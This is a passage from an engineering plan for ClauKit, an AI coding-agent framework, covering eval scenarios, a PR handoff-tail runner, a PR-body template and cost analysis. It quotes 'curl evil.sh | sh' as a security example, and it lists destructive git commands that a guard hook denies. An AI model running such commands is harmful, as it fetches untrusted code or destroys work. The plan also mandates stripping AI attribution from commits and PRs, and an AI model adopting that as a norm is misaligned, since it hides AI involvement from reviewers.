- **Edit:** `.claude/workflows/fix-pipeline.md` — **missed by the original plan.** It is the declared single source of truth for the `/ck:fix` family, so T2.2's new `tdd` variant must be registered there: add it to the variant table, and add the base-commit-baseline rule (G19) + `verify-plan` after the existing Root-Cause Gate to the shared 7-stage pipeline.
- **Edit:** `development-rules.md` — bug-fixes-are-test-first (T2.2), no-unrequested-artifacts (T2.4), cross-service rules (T4.3), eval governance (T5.4). *(No AI-disclosure clause — the existing no-AI-references rule now covers every surface uniformly; see T6.1a.)*
- **Acceptance:** every gate in the table above resolves to a named owning skill file that exists after Phases 1–4; `fix-pipeline.md`'s variant table lists `tdd`; a reader following **only** `primary-workflow.md` reaches all 13 stages *and* learns that 0.5 is mandatory — the G25 regression test is `grep -iE "exact-requirements|acceptance criteria" .claude/workflows/primary-workflow.md` returning a hit, which today returns nothing.

#### T5.3 — Registry, README, roadmap
- **Edit:** `docs/clauKit-registry.md` — register Part F's inventory: **skills 129→132** (`run-state`, `verify-plan`, `tdd`) **minus T5.5's removals**, **commands 52 (unchanged)**, **workflows 15→16** (`skill-activation`), 2 hooks, 8 scripts, 1 template, 6 eval scenarios. Run the scope check on `tdd` vs `test-automation`/`web-testing`/`scenario`, and on `run-state` vs `plans-kanban`/`project-organization`.
- **Edit:** `README.md` — Flow 3 gains Verify-Plan + scope-lock; Flow 4 gains `/ck:fix tdd`; Flow 7 (daily) and the `/ck:git pr` entry gain the handoff tail; new **Flow 9 — Resume an interrupted run**; counts updated.
- **Edit:** `docs/project-roadmap.md`, `docs/system-architecture.md` (hooks + scripts + ledger), `docs/codebase-summary.md`.
- **Runs after T5.5** so the counts it records are final.
- **Acceptance:** registry counts match a fresh filesystem count; README flow diagrams reflect the new gates.

#### T5.4 — Minimal behavioral eval harness — *the lesson from the Superpowers comparison (Part C.2)*
This plan's own risk table concedes that "prompt-instruction changes are unverifiable" and falls back to per-task observable runs. Superpowers shows that concession is unnecessary: it treats skills as **behaviour-shaping code** and gates changes on eval evidence, driving real sessions with an LLM verifier that judges skill compliance. ClauKit has 129 skills and **2 test files, both for one hook** — so nothing today can tell whether a gate actually fires under pressure.

- **New:** `tests/behavior/` — a thin harness (bash + the `claude -p` CLI already required by T4.2, no new dependency) that runs a scenario prompt against a scratch repo and asserts on the transcript.
- **Six scenarios**, one per gate this plan claims to install — chosen because each is a *behaviour* no diff review can confirm:
  1. `verify-plan` fires before any edit when handed a plan containing a false claim (T2.1);
  2. `tdd` produces a red test with pasted failure output before touching source (T2.2);
  3. scope-lock emits the A/B table and halts instead of planning (T2.4);
  4. a resumed run reads `STATE.md` and re-derives state rather than re-implementing (T1.1);
  5. a completion claim without fresh evidence is refused (existing Iron Law — **regression guard**, since nothing tests it today);
  6. `git add -A` with a seeded foreign claim is declined and the scoped command offered (T1.2).
- **Adopt Superpowers' tiering, not its scale:** these are slow and non-deterministic, so run the fast subset on demand and the full sweep before a release — not on every commit.
- **Governance rule** (`development-rules.md`): a change to a *behavioural* skill (`tdd`, `verify-plan`, `run-state`, `code-review`, `debugging`) requires a scenario run before/after. Reference skills — the other ~124 — are exempt; they document capability rather than shape behaviour, and evaluating them would be theatre.
- **Acceptance:** all six scenarios run green against the finished Phase 1–2 work, and each fails when its gate is deliberately removed from the relevant skill. A scenario that passes with the gate deleted is not a test.

#### T5.5 — Run the overlap audit the registry was built for (housekeeping, low risk)
**Finding:** the registry defines a `❗ Potential overlap` marker and **has never used it** — `grep -c ❗` returns **1**, the legend row itself, across 210 entries. The duplicate-detection mechanism exists on paper only, which is how the two items below survived.

- **Confirmed duplicate — resolve:** `marketing/programmatic-seo` ("template pages, data sources, internal linking at scale") vs `marketing/seo-programmatic` ("template-based page generation at scale (pSEO)"). Same subject, two imports (coreyhaines31 vs claude-seo). **Keep `seo-programmatic`** — CLAUDE.md designates claude-seo as the SEO backbone and all `/mk:seo*` route through it; fold anything unique from `programmatic-seo` into it, then remove and redirect cross-links.
- **Overlap — decide:** `software/preview` ("presentations Marp/reveal.js **or view/render markdown**") vs `software/markdown-novel-viewer` ("serve markdown as book-like HTML via local HTTP server"). The markdown-rendering half is duplicated. Either merge into `preview` or narrow `preview` to presentations only.
- **Checked and NOT duplicates — leave alone** (recorded so this is not re-litigated): `competitors`/`competitor-profiling`/`competitor-alternatives` (landscape vs single-competitor deep-dive vs comparison-page artifact) · `emails`/`email-sequence`/`cold-email` · `copywriting`/`copy-editing` · `ck-graphify`/`gkg`/`tech-graph` (code-AST graph vs text knowledge graph vs SVG diagrams — the shared word "graph" is the only overlap) · `/ck:fix test` vs new `/ck:fix tdd` (failing-suite input vs production-symptom input; see Q4).
- **Then use the marker:** flag any surviving deliberate overlap with `❗` and a one-line scope note, so the next audit starts from a real baseline.
- **Acceptance:** `grep -c ❗` > 1; the duplicate is resolved with cross-links updated; kit manifests still pre-flight clean (`ck init` fails loudly on a manifest path that no longer exists, so a removal that misses a manifest is caught immediately).

---

### Phase 6 — Delivery Tail & Resilience (P1/P2) — *from User B*

#### T6.1 — Fold the handoff tail into `/ck:git pr` (G21) — **no new command, no new workflow, no built-in step list**
The most-repeated request in User B's data (14 end-to-end + 9 handoff + **6 pure-PR** sessions) is the tail ClauKit stops short of. **Their** tail was: team-format description → tracker transition → reviewer mention → worklog → worktree teardown. Read that as *one instance*, not the specification — it is the shape of one team's tracker/VCS stack, and the deliverable below is the mechanism that runs any such list, shipped with an empty one.

**Decision (D6, revised):** extend the existing `/ck:git pr` action instead of adding `/ck:ship` + `ticket-delivery.md`. A second command over the same concept violates ClauKit's *one concept = one primary entry point* rule and would split PR logic across two files; `/ck:git` is already the dispatcher and **T1.5 is already rewriting its `pr` action**, so the tail lands in a file this plan opens anyway. YAGNI on both new artifacts.

- **Edit:** `.claude/commands/ck/git.md` §`pr` — one action, ordered, **sharing T1.5's verify → menu → auth-fallback skeleton**:
  1. tests + typecheck green (Iron Law) — T1.5;
  2. self-review the diff, scoped to session files only — T1.4;
  3. **PR description generated from the pipeline's own artifacts** via `pr-body.md` + the T6.1a fill contract (a project may override the template);
  4. open the PR **draft-default** — draft unless explicitly told otherwise. Reviewer time is expensive, and a wrong root cause reaching "ready" is exactly what produced three bad merges;
  5. **run the project's declared handoff steps, in declaration order** (contract below);
  6. **worktree teardown** via `wt-clean` (T1.6) once the PR is open.
  Steps 1–4 and 6 are universal and always run. **Step 5 ships empty.**
- **ClauKit declares no handoff steps of its own.** `transition → peer-review`, `reviewer mention`, and `worklog` are one commercial tracker suite's vocabulary: a worklog does not exist on GitHub Issues, Gitea, or sourcehut, and "transition to a peer-review state" presumes a configurable workflow most trackers don't have. Baking those three in as steps 5–7 would encode one stack's shape into a generic kit even with a perfect adapter underneath — an adapter abstracts *how* a step is executed, not *whether the step exists*. So the default tail is **empty**, and `/ck:git pr` ends at a draft PR + teardown for any project that declares nothing.
- **Declaration contract** — `/ck:claude-md` template (T4.3) gains an optional block; absent or empty ⇒ no tail, no notice, no complaint. **One bullet per step, four fixed keys as sub-bullets:**
  ```markdown
  ## Delivery tail (optional)
  <!-- Steps run in listed order after the PR opens. Delete this block if unused. -->
  - **close-issue**
    - run: `gh issue close {{issue}} --comment "Fixed in {{pr_url}}"`
    - needs: issue (from branch name), pr_url
    - done-when: `gh issue view {{issue}} --json state -q .state` = `CLOSED`
    - on-fail: paste-ready
  ```
  **Format decision:** markdown sub-bullets, not a `·`-separated one-liner and not a fenced YAML block. A one-liner breaks the moment `run:` contains a shell command with its own punctuation — which is the common case. YAML would introduce a second syntax into a CLAUDE.md that has none, and buys nothing: the consumer is a model, not a strict parser. Sub-bullets are diff-friendly (one line changes one field), scale to long commands, and are how every other CLAUDE.md block is already written. Cost is ~5 lines per step instead of 1, paid only by projects that declare a tail.
  - `done-when` is deliberately the **same shape as T2.3's machine-checkable exit gates**: a command plus its expected result. That is what makes idempotency enforceable instead of aspirational.
  - Sample steps for Jira/GitHub/Linear ship **commented out inside the template**, never in the skill — the template is per-project by design and is the only correct home for vendor names.
- **Edit:** `skills/software/git/SKILL.md` — canonical knowledge is the **execution semantics of a declared tail**, not a step list: run in declaration order · check-before-write idempotency · auth failure ⇒ paste-ready payload, never a retry and never a dead end (per T1.5) · one `STATE.md` line per step · an unparseable declaration is reported and skipped, it does not abort the PR. Trio rule preserved: skill = knowledge, `git-manager` = persona, `/ck:git pr` = trigger.
- **Edit:** `.claude/workflows/primary-workflow.md` (T5.2 already rewrites it) — the head-to-tail chain becomes **stage 8 Finish** of the existing primary workflow, not a parallel workflow document. One pipeline, one place.
- **Execution preference per step:** connected MCP server → CLI → paste-ready payload. This is a property of the *runner*, so it lives in the skill and applies to any declared step whatever it is called.
- **Always deterministic, one code path** (decided; revised from "always headless `claude -p`" — the premise was right, the mechanism was not). Step 5 is `scripts/ck/delivery-tail`, a plain executor — never inline in the interactive session, and never with an escalate-to-ask branch. Three reasons: (1) a declared step carries `run` + `done-when`, so it is deterministic by construction — a step that needs judgement does not belong in a declared tail, it belongs in the plan. **Taking that premise seriously means not spawning an LLM to execute it**; (2) the failure path is already defined and better than asking — a non-zero exit or a missing input emits the paste-ready payload, writes one `STATE.md` line, and exits 0 (T1.5's never-dead-end rule); (3) **this is the part spend limits keep eating**, so it must be the cheapest thing in the pipeline — at zero tokens it cannot be eaten. Same script, same behaviour, whether invoked by `/ck:git pr` or by hand on resume.
- **Idempotency required** (the tail is re-run after an interruption): every declared step names its own already-done check, and the runner honours it — a re-run must produce no second write of anything. The PR description is **updated in place, never appended to**. A step that declares no idempotency check is run **once** and then reported, never retried blind.

#### T6.1a — `pr-body.md` template + fill contract (supports T6.1 step 3)
**New:** `skills/software/git/references/pr-body.md` — shipped as the ClauKit default (no manifest change needed: the manifests already copy `.claude/skills/software/` wholesale). A project may override it via the `/ck:claude-md` block from T4.3.

```markdown
## Problem

{{problem_statement}}

## Approach

{{approach_bullets}}

## Tradeoffs & decisions

{{tradeoffs_bullets}}

## Review focus

{{review_focus_bullets}}

## Plan

- Plan file: [{{plan_path}}]({{plan_path}})

## Testing

- **What was tested**: {{testing_what}}
- **How it was tested**: {{testing_how}}
- **Edge cases**: {{testing_edge_cases}}
```

**8 placeholders, no tracker field, no AI-attribution footer.** Two consequences to encode rather than discover later:
- **Ticket linkage lives outside the body** — the branch name, the PR title, and the tracker's own PR link carry it. T6.1 steps 5–7 (transition · reviewer mention · worklog) are unaffected; they talk to the tracker API, not to this template.
- **No AI-attribution anywhere.** This now agrees with the existing rules instead of qualifying them: `development-rules.md` already says *"Create clean, professional commit messages without AI references"* and `settings.json` sets `includeCoAuthoredBy: false`. Commits, PR bodies, and trailers are uniformly free of AI references — one rule, no per-surface exception. Nothing to add to `development-rules.md`.

**Fill contract — every placeholder has one upstream source.** This is what stops the body being plausible prose: each field is *transcribed* from an artifact the pipeline already produced, not composed at PR time.

| Placeholder | Source of truth | Rule |
|---|---|---|
| `{{problem_statement}}` | the **CONFIRMED** root cause from `plans/<plan>/reports/plan-verification.md` (T2.1) | never the initial hypothesis. A wrong root cause shipped in **3 merged PRs** for User B — the PR body must carry the cause that survived falsification, with its evidence citation |
| `{{approach_bullets}}` | the scope option the user **picked** in T2.4's A/B table | state which option, and the repos/layers it touches |
| `{{tradeoffs_bullets}}` | the **rejected** option from the same A/B table + why | the gate already produces this content; do not re-derive it |
| `{{review_focus_bullets}}` | `STATE.md` parked/deferred findings (T3.4) + blast-radius areas from T4.1 + anything still marked `[UNVERIFIED]` | this is where a reviewer's attention is genuinely needed, so it must be honest about what was *not* proven |
| `{{plan_path}}` | the plan directory | repo-relative. **The plan must be committed or the PR link 404s** — verify before writing the body. No plan (hotfix, one-line fix) → write `Plan file: none — <reason>`, never an empty link |
| `{{testing_what}}` | `tester` report | the suites/cases actually executed |
| `{{testing_how}}` | verbatim command + result | Iron Law applies: the command and its output, not "ran the tests" |
| `{{testing_edge_cases}}` | `scenario` skill output — cook Stage 3 already requires ≥1 happy + ≥1 negative + ≥1 recovery | list them; if a class was skipped, say which and why |

**No-placeholder rule (mirrors T2.3):** an unfilled `{{...}}` must never reach a PR. A section with genuinely nothing to say is written as an explicit negative — `Tradeoffs: none — single viable approach given <constraint>` — because inventing tradeoffs to fill a heading is exactly the padding the evidence gates exist to prevent. The T5.4 eval scenario for this: a seeded run whose plan has no rejected option must emit the explicit negative, not prose.

**Acceptance (T6.1a):** a generated body contains all 8 sections with zero surviving `{{...}}`; the plan link resolves in the PR UI; no section is padded with invented content (a run with a single viable approach emits the explicit `Tradeoffs: none — …` negative); the body contains no tracker field and no AI-attribution line.

- **Acceptance (T6.1)** — the *default* path is the primary test, because that is what every project gets on install:
  1. **No `Delivery tail` block declared** (ClauKit's own repo, and any fresh install): `/ck:git pr` produces a draft PR with a filled `pr-body.md`, tears down the worktree, exits 0. No tracker prompt, no warning, no skipped-step notice.
  2. **A declared 2-step tail** (seeded: one MCP step, one CLI step) runs both in declaration order and writes 2 `STATE.md` lines; **re-running changes nothing** (idempotency check fires on both).
  3. **Declared step whose backend is unauthenticated**: steps 1–4 and 6 still complete, the failing step prints a paste-ready payload, exit code stays 0, zero retries in the transcript.
  4. **Grep gate:** `grep -riE 'jira|tempo|worklog|bitbucket|transition to' skills/software/git/` returns **nothing**. Vendor vocabulary appearing in the skill means the step list leaked back in.

#### T6.2 — Overload resilience (G23)
- **Edit:** `skills/software/context-engineering/references/model-tiering.md` (T3.3) — on `529 Overloaded` / transient API failure: retry once with backoff, then **fall back one tier** and record the substitution in `STATE.md` rather than surfacing a dead end. A killed background agent must be detectable from the ledger — User B had one die leaving **no changes at all**, and the work was silently redone.
- **Edit:** `orchestration-protocol.md` — after any subagent dispatch, **verify the agent actually changed something** (VCS diff) before recording it complete. "Agent reported success" is not evidence (already an Iron Law row — this applies it to the orchestration path).
- **Acceptance:** a simulated dead subagent yields a `phase N: agent died (no diff) — redispatch` ledger line, not a false completion.

---

## Part F — Sequencing, Risk, Non-Goals

### Ordering rationale

| Phase | Removes | Depends on |
|---|---|---|
| 1 | broken install · lost work · destroyed trees/toolchains · dead-end PRs | — |
| 5 (T5.2 only) | **G25 — the mandatory requirements gate being invisible from the declared primary workflow.** Cheap (one doc edit + a link) and independent of every other task, so it can ship with T1.0 in the P0 patch rather than waiting for Phase 5 | — |
| 2 | implementing against false claims · over-scoped changes · post-hoc tests · stale-status claims | T1.1 (ledger records gate evidence), T1.6 (worktree baseline for T2.2/T2.5) |
| 3 | context/spend blowups · serial cross-repo tracing (T3.5) | T1.1, T2.3 (gates + interfaces make per-phase dispatch safe) |
| 4 | shallow review · interactive review + handoff cost | T3.2 (review-package script) |
| 5 | drift between docs and behavior | all |
| 6 | retyped handoff tail · silent agent deaths | T1.1, T1.5, T1.6, T2.1, T2.4, T4.2 |

Phases 1–2 remain the ones worth shipping first even if the rest slips: together they address every P0/P1 in the register except G21 (Phase 6). **T1.6 is now on the critical path** — T2.2's baseline rule and T2.5's pre-existing-failure evidence both require a provisioned worktree, so the smoke gate has to land before Phase 2 can be honest.

### Risks

| Risk | Mitigation |
|---|---|
| The new hook blocks legitimate work (the exact failure mode of `scout-block`) | T1.2 ships 26 unit tests + `CK_ALLOW_DESTRUCTIVE=1` escape hatch; Tier B denies only on live evidence, never on a static rule; T1.3 fixes the existing precision bug **first** |
| Claim registry goes stale → false denials push the user back toward `git add -A` | three independent self-cleaning mechanisms: dirty-check against `git status`, TTL (`CK_CLAIM_TTL`, default 4h), and per-worktree scoping. Tier B **fails open** — an unreadable registry allows the op and says so |
| Registry write contention between concurrent sessions | append-only single JSONL lines, no lock, no daemon; readers tolerate partial trailing lines |
| Ledger becomes ceremony nobody reads | one line per event, append-only, and it is the **input** to resume — if resume works, the ledger is load-bearing by construction |
| `tdd` overlaps `test-automation` / `scenario` | explicit scope boundary in T2.2 + registry overlap check in T5.3 |
| Verify-Plan adds a gate to every run | mandatory only for `--from-plan` (the case that actually failed); opt-in elsewhere |
| Prompt-instruction changes are unverifiable | each task's acceptance criterion is an **observable run**, not a diff review; hooks and scripts get real unit tests in `tests/` — on the `node:test` harness T1.0b installs, since the repo had no runner capable of hosting them |
| Fresh-implementer-per-phase loses cross-phase knowledge | Interfaces blocks (T2.3) carry exactly the names/types neighbors need |
| Smoke gate makes worktree setup slow enough that people skip it | Q8 decides the default (typecheck + targeted vs full suite); `wt-doctor` is cheap and always runs; the gate's output is cached per base commit so re-provisioning the same base is free |
| Scope-lock A/B gate adds a stop to every run and gets rubber-stamped | only fires when the task *could* span >1 layer/repo; in `--auto` it picks minimal and logs `[ASSUMED]` — the failure mode it prevents cost a full plan-write cycle each time it occurred |
| T6.1 becomes vendor-coupled in practice despite the adapter design | structural, not procedural: ClauKit declares **zero** handoff steps, so there is nothing vendor-shaped to couple to. Enforced by acceptance test 4 — a grep for tracker vocabulary in `skills/software/git/` must return nothing — plus test 1, where the no-declaration default is the primary case |
| The declared tail is so open-ended that nobody writes one, and the mechanism ships dead | acceptable: an unused mechanism costs ~10 lines in a template, while a wrong built-in list costs every project that isn't on that stack. The commented-out samples in the `/ck:claude-md` block are the discoverability path; `/ck:claude-md init` surfaces the block once |
| Two feedback reports over-fit ClauKit to one team's stack (both users are on the same team) | every task above is stated as a pattern with the incident as *evidence*, not as the rule; the vendor-specific residue is confined to the `/ck:claude-md` template, which is per-project by design |

### Non-goals

- No new agents (29 stays 29). No new orchestration layer.
- No native `Workflow`/`ultracode` adoption — `/ck:flow` remains the entry point.
- Marketing kit untouched except the shared manifest keys in T1.0.
- No port of Superpowers' voice, 5-round breaker, PR-policy content, or `writing-skills`.
- Not rewriting the 129 existing skills — only the files named above.
- **No `PostToolUse` typecheck-on-every-edit** (see B.2.3) — enforcement belongs at the phase exit gate; offered as documented opt-in only.
- **No tracker/VCS vendor lock** — no tracker, VCS-host, or client-project identifier appears in any skill or workflow. Stronger than adapter-shaped: **ClauKit ships no handoff step list at all**, so there is no vendor shape to abstract. Steps are project-declared; vendor names appear only in commented-out samples inside the per-project `/ck:claude-md` template.
- **No built-in `transition` / `reviewer mention` / `worklog` steps.** Two of the three do not exist outside a single commercial tracker suite. A generic kit that ships them as defaults has chosen a tracker on the user's behalf.
- **Not building** User B's nightly staging-QA watchdog (browser + DB cross-check + auto-file tickets). It is the strongest idea in either report, but it is a *product* on top of ClauKit, not a framework change: it needs journey specs, a scheduler, and tracker write access. Revisit as a separate plan once Phase 6 exists — T6.1's declaration contract and T3.5's shape-reporting are the two pieces it would build on.

### Revised inventory

| Kind | Count | Items |
|---|---|---|
| New skills | 3 | `run-state`, `verify-plan`, `tdd` |
| New hooks | 2 | `guard-destructive`, `file-claims` |
| New scripts | 8 | `phase-brief`, `review-package`, `run-workspace`, `wt-new`, `wt-doctor`, `wt-clean`, `ci-review`, `delivery-tail` |
| New workflows | 1 | `skill-activation.md` |
| New templates | 1 | `git/references/pr-body.md` (T6.1a) |
| **Removals** | 1–2 | `programmatic-seo` (confirmed duplicate) · `markdown-novel-viewer` (merge candidate, T5.5) |
| New commands | **0** | — (handoff tail folded into `/ck:git pr`; `/ck:ship` dropped) |
| New agents | **0** | — |
| Eval scenarios | 6 | T5.4 — the behavioral gates that cannot be verified by reading a diff |

Registry impact: **skills 129→132, commands 52 (unchanged), workflows 14→15.** *(Baseline corrected: `ls .claude/workflows/*.md` = **14**, not 15 — the registry's own prose was off by one, and `skill-activation.md` is now the only new workflow.)* Everything else is an edit to a file that already exists — which is the point: the framework's problem was never missing surface area.

---

## Decisions Made

- **D1 — Ledger location:** `plans/<plan>/STATE.md`, committed alongside the phase it records. Rejected the git-ignored alternative: `git clean -fdx` would destroy exactly the artifact that exists to survive an interruption. **Correction (verified):** the location was already git-ignored by `plans/**/*`, so D1's stated advantage did not exist. It is real only after T1.0's `.gitignore` stanza lands — which also un-ignores `plan.md`, without which T6.1a's PR plan-link 404s.
- **D2 — Guard strictness:** two tiers. Irreversible-loss shapes deny unconditionally (with an env escape hatch); over-broad staging denies **only when the claim registry proves another live session owns an affected file**, and the denial prints the scoped command to run instead. Chosen because a static deny fires on legitimate fresh-repo commits, while warn-only is precisely the kind of soft signal the model rationalizes past. Also pulled `git commit -a`/`-am` into scope — it stages everything without ever calling `git add`, so an add-only guard would have missed the most common shape.
- **D3 — Worktree isolation promoted twice.** First from a nicety to the structural fix (43% / 29% multi-clauding across the two users); then, on User B's data, from *knowledge* to **tooling with a smoke gate** — worktrees were their single largest source of lost work precisely because ClauKit ships the concept without scripts. T1.6 is now on the critical path for Phase 2.
- **D4 — Scope-lock is a separate gate from evidence** (T2.4 ≠ T2.1). User B's `wrong_approach 10` + `excessive_changes 4` show a correct diagnosis can still ship a change three times too large; the two failures need two gates, and both land before planning where they are cheapest.
- **D5 — The adversarial reviewer never sees the implementer's reasoning.** Diff + requirement only. A reviewer handed the rationale grades the rationale.
- **D6 — The handoff tail is *declared*, not adapter-shaped** (revised — adapter-shaped was not enough). An adapter abstracts *how* a step runs; it still forces a step **list**, and `transition` / `reviewer mention` / `worklog` is one tracker suite's list that most other trackers cannot express. ClauKit therefore ships **zero** handoff steps and only the machinery to run whatever a project declares. Default install = draft PR + teardown, full stop. This is the one place the "generic repo" constraint was being violated by a design that *looked* generic.
- **D6b — No `/ck:ship`, no `ticket-delivery.md`** (user decision). The handoff tail folds into the existing `/ck:git pr` action — the same file T1.5 already rewrites — with the chain expressed as stage 8 of `primary-workflow.md`. Net effect: **0 new commands, 1 new workflow instead of 2**, and PR logic stays in one place. This is the *one concept = one entry point* rule applied to my own proposal.
- **D7 — Add a behavioural eval harness (T5.4).** Surfaced by the Superpowers comparison: ClauKit ships 25× the skill content on 1/6 the verification. Six scenarios, one per installed gate, each required to fail when its gate is removed. Without this, every behavioural claim in this plan is an assertion.

## Resolved — Recommended Answers (cost as tiebreaker)

- **R1 · Verify-Plan scope.** Mandatory for `--from-plan`; elsewhere auto-trigger **only when the plan asserts ≥1 falsifiable claim about existing behaviour** (a root cause, "X currently does Y", affected row counts, "this is already done"). A greenfield feature plan has nothing to falsify, so running the gate there is pure cost. Both wrong-root-cause incidents were existing-behaviour claims — this targets the actual failure mode at a fraction of "always on".
- **R2 · CI review portability.** One provider-agnostic `ci-review` script + **two thin wrappers** (GitHub Actions + the source team's CI provider, ~15 lines each). Both users are on the same non-GitHub VCS host, which is where the PR step kept failing; the script holds all logic so any further provider is another 15 lines.
- **R3 · Ship T1.0 immediately as a standalone patch.** One JSON key in three manifests, zero dependencies, fixes a **P0 broken install**. Do not hold it behind a six-phase plan.
- **R4 · Keep both `/ck:fix test` and `/ck:fix tdd`.** Different inputs — a red suite vs a production symptom — which is exactly how `fix-pipeline.md` already models variants. Sharpen both descriptions; merging would destroy a real distinction and save nothing.
- **R5 · Tier-B with an unwritten registry:** notice **once per session**, then allow silently. A guard that is not armed must say so once — silent permissiveness reads as protection that isn't there.
- **R6 · Add `--no-handoff` to `/ck:git pr`.** A WIP PR mid-ticket is a real case and the tracker-not-configured skip does not cover it. One flag.
- **R7 · `wt-new` covers npm + pnpm from day one**, yarn on request. Detect from the lockfile. Rationale: pnpm's content-addressed store makes the symlink/exit-216 hazard **more** likely, not less — shipping npm-only would leave the sharper edge exposed.
- **R8 · Smoke gate: tiered *and* cached — the cost question has a better answer than either option.** Typecheck always (seconds); targeted suite for the touched area; **full suite once per base commit, with the result cached keyed by the base-commit SHA**. The insight: the gate answers *"is my baseline trustworthy?"*, which is a property of **the base commit, not of the worktree** — so it is legitimately cacheable, and a cached green is as good as a fresh one. That makes the honest full-suite gate affordable **once** instead of once per worktree, which is what made it look expensive.
- **R9 · Split T6.1 rather than move it.** Its halves have different dependencies:
  - **→ Phase 1** (depends only on T1.5): the universal skeleton — verify → self-review → draft-default PR → worktree teardown, plus auth-fallback and `--no-handoff`. Empty tail, no declaration needed. This captures the *6 pure-PR-creation sessions* win immediately.
  - **→ stays Phase 6** (depends on T2.1/T2.4): the **pr-body fill contract** (T6.1a), because `{{problem_statement}}` is the CONFIRMED root cause from T2.1's report and `{{tradeoffs_bullets}}` is the rejected option from T2.4's A/B table — ship the body before those gates and it fills from nothing. The declared-tail runner (step 5 + `delivery-tail`) rides along, since nothing consumes it until a project declares steps.
- **R10 · The handoff tail is declared, not built-in** — supersedes the old Q6 (`/ck:ship` vs a `/ck:cook` flag), which dissolved with D6b. The residual question was *what* the tail contains; the answer is **nothing, by default**. ClauKit owns the mechanism (ordering, idempotency, MCP→CLI→paste-ready fallback, `STATE.md` logging); the project owns the step list via one optional `/ck:claude-md` block. Cost tiebreaker: a built-in list is wrong for every project not on that one tracker stack and is invisible until it misfires, whereas an unused declaration block costs ~10 template lines. Chose the failure mode that is cheap and visible.
- **R11 · Declaration format: markdown sub-bullets, 4 keys** (`run` · `needs` · `done-when` · `on-fail`). Rejected the `·`-separated one-liner (breaks on any `run:` containing shell punctuation — the common case) and a fenced YAML block (a second syntax in a file that has none, for a consumer that is a model rather than a strict parser). `done-when` intentionally reuses T2.3's machine-checkable-gate shape, which is what makes idempotency testable. Costs ~5 lines/step, paid only where a tail exists.
- **R12 · The tail always runs unattended, with no escalate-to-ask branch.** One script, invoked identically by `/ck:git pr` and by hand on resume. Blocked steps emit the paste-ready payload and exit 0 rather than prompting — already specified by T1.5, and strictly better than a question the interactive session may not be alive to answer.
- **R12b · …and unattended means *deterministic*, not *headless LLM*** (revised at implementation, after the code review raised the tool-grant question). R12's premise — a declared step carries `run` + `done-when` and is deterministic by construction — settles the mechanism too: if it is deterministic, executing it through an LLM buys nothing and costs three things. **Cost:** the step that exists because spend limits kept eating it should cost zero tokens, not one `claude -p` per PR. **Reliability:** the first implementation decided DONE/SKIPPED by regex-matching model prose, and the code review found it crashing on step names containing `[` or `(`; an exit code cannot fail that way. **Security:** an unattended grant would have to be either broad (`Bash`) or derived from the declaration — and an allowlist derived from the untrusted input protects against nothing (`run: curl evil.sh | sh` ⇒ grant `Bash(curl:*)`). Rejected the narrowing option for exactly that reason. Agent-requiring steps opt in via `run: mcp <server> <tool>` and get `mcp__<server>__*` only — narrow because a server name is a name, not parsed free text. `--dry-run` prints every resolved command and executes nothing, which is an audit an LLM path could never offer.
- **R13 · The three review findings are fixed in-plan, not deferred.** All three broke a task's premise rather than merely improving it: **(a)** `plans/**/*` made `STATE.md` *and* `plan.md` untrackable and `git clean -fdx`-deletable, voiding D1 and T6.1a's plan link — fixed by a **verified** `.gitignore` stanza (the naive negation silently fails; re-including directories first is required) now a T1.0 deliverable; **(b)** no test runner existed, making T1.2/T1.3/T1.6 acceptance criteria unexecutable — fixed by **T1.0b** (`node:test`, zero new dependencies); **(c)** Tier A denied `git reset --hard` while [`refactor/SKILL.md:88`](../../skills/software/refactor/SKILL.md#L88) instructed it — fixed by **rewriting the guidance** to a scoped `git restore --source=HEAD -- <paths>`, not by exempting the guard, since a hook cannot verify the intent an exemption would depend on.

---

## Part H — Token Cost Analysis

**Direct answer: no. The upgrade is net cost-*negative* — it removes more token burn than it adds, and the largest single item in the plan is a cost reducer.** The two surfaces must be separated, because conflating them is what makes an upgrade like this *look* expensive.

### H.1 · Always-loaded context (paid every session, every turn)

| Change | Delta |
|---|---|
| 3 new skill descriptions | ~40 tokens (skills are lazy — only the description loads) |
| `skill-activation.md` (new, designed to be read each session) | ~70 lines |
| `primary-workflow.md` 90 → ~135 lines | +45 lines |
| `orchestration-protocol.md` +tier column, +rules | +30 lines |
| `development-rules.md` +4 rules | +15 lines |
| **New agents** | **0 → +0 tokens** |
| **New commands** | **0 → +0 tokens** (after D6b) |

≈ **+160 lines of always-read markdown ≈ 1.5–2.5k tokens/session** (estimate), i.e. **~1% of a 200k window**.

**Why 0 new agents matters more than 0 new skills:** agent name+description are injected into the system prompt **unconditionally, every session**, to support dispatch routing. Skills are lazy — only descriptions load, bodies load on use. So the always-loaded cost of this plan is dominated by markdown the model already reads, and the expensive surface (agents) is untouched. This is also why *removing* skills (Part D discussion) buys almost nothing while removing agents would.

### H.2 · Per-run execution cost — where the real money is

**Reductions (all of them attack the top friction in both reports):**

| Task | Mechanism | Why it is large |
|---|---|---|
| **T3.1 + T3.2** | implementation moves to a fresh subagent per phase; artifacts handed over **as file paths** | Today `cook` implements in the main agent, so every file read, diff, and test output accumulates in **one** context and is re-sent on every later turn — growth is super-linear in phase count. User A's 2,548 Reads + 4,773 Bash + 989 DB queries sat largely in one lineage. Superpowers documents a dispatch that reached 42k chars of which **99% was pasted history**. This is the single biggest lever in the plan. |
| **T3.3** | mandatory explicit `model=` + tier matrix | An omitted model inherits the session model — often opus. Routing mechanical work to haiku/sonnet is a multiple, not a percentage. |
| **T1.1** | resume from ledger | ≥11 spend/session kills across the two users, each previously costing **full state reconstruction**. Recovered waste, not new spend. |
| **T2.1** | falsify before implementing | User B shipped a wrong root cause through **3 merged PRs**, then paid corrective + cleanup PRs. One gate (a few queries + a table) against three full implement→review→PR cycles. |
| **T2.4** | scope lock before planning | Twice prevented a whole plan-write cycle being thrown away (cross-repo → FE-only). |
| **T4.2** | review + tail run headless | Review was 12 sessions (User A); PR/VCS mechanics 12 sessions (User B). An interactive session carries all accumulated context; a `claude -p` run carries only the diff. |
| **T1.6** | smoke gate | Every hour spent working in an exit-216 environment was tokens spent and discarded. |

**Increases — stated honestly:**

1. **T4.1 multi-lens review is a genuine ~4× on the review stage.** It is the one real cost increase in the plan. Controls, all already compatible with the design:
   - it is an **opt-in flag** (`--lenses`); default `/ck:review` stays single-reviewer;
   - **gate it on diff size/risk** — fire only above a threshold (>~200 changed lines, >3 files, or touching auth / payments / migrations / cross-service boundaries);
   - **tier the lenses** — CONVENTION and BLAST-RADIUS take a cheap tier with narrow prompts; only ADVERSARY escalates on a risky diff;
